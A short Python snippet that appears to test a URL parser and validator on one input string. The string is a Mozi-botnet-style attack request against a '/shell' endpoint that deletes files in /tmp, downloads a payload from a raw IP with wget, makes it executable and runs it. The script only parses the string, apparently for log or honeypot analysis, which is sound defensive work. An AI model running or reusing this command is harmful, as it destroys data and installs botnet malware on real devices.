from utils.misc import url_parser, validate_url

urls = url_parser("GET /shell?cd /tmp;rm -rf *;wget http://82.24.38.130/;chmod 777 Mozi.a;/tmp/Mozi.a jaws HTTP/1.1")



for url in urls:
    print(validate_url(url))